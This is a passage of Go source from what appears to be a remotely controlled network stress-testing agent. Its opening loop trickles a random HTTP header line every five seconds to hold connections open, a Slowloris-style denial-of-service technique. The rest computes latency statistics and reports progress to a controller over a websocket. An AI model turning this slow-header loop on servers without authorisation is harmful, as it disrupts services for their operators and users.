					case <-time.After(5 * time.Second):
						line := fmt.Sprintf("X-a-%s: %s\r\n", randStr(4), randStr(8))
						_, err := conn.Write([]byte(line))
						if err != nil {
							break
						}
						atomic.AddInt64(bytesSent, int64(len(line)))
					}
				}
				conn.Close()
				atomic.AddInt64(activeConn, -1)
				updateMinMax(minLat, maxLat, latency)
			}
		}()
	}
}

// ========== 辅助函数 ==========

func updateMinMax(minLat, maxLat *int64, latency int64) {
	for {
		cur := atomic.LoadInt64(minLat)
		if latency >= cur || atomic.CompareAndSwapInt64(minLat, cur, latency) {
			break
		}
	}
	for {
		cur := atomic.LoadInt64(maxLat)
		if latency <= cur || atomic.CompareAndSwapInt64(maxLat, cur, latency) {
			break
		}
	}
}

func makeProgress(sent int64, totalSuccess, totalErrors, totalLatency, minLat, maxLat *int64,
	rps float64, bs, br int64, mbpsSent, mbpsRecv float64, activeConn *int64, running bool) StressProgress {

	avgLat := float64(0)
	if sent > 0 {
		avgLat = float64(atomic.LoadInt64(totalLatency)) / float64(sent) / 1e6
	}
	minL := float64(atomic.LoadInt64(minLat)) / 1e6
	maxL := float64(atomic.LoadInt64(maxLat)) / 1e6
	if minL > 1e9 {
		minL = 0
	}

	return StressProgress{
		Sent:       sent,
		Success:    atomic.LoadInt64(totalSuccess),
		Errors:     atomic.LoadInt64(totalErrors),
		RPS:        round2(rps),
		AvgLatency: round2(avgLat),
		MinLatency: round2(minL),
		MaxLatency: round2(maxL),
		BytesSent:  bs,
		BytesRecv:  br,
		MbpsSent:   round2(mbpsSent),
		MbpsRecv:   round2(mbpsRecv),
		ActiveConn: atomic.LoadInt64(activeConn),
		Running:    running,
	}
}

func sendStressMsg(conn *websocket.Conn, writeMu *sync.Mutex, msgType, taskID string, progress StressProgress) {
	payload, _ := json.Marshal(progress)
	msg, _ := json.Marshal(AgentMessage{
		Type:    msgType,
		ID:      taskID,
		Payload: payload,
	})
	writeMu.Lock()
	conn.WriteMessage(websocket.TextMessage, msg)
	writeMu.Unlock()
}
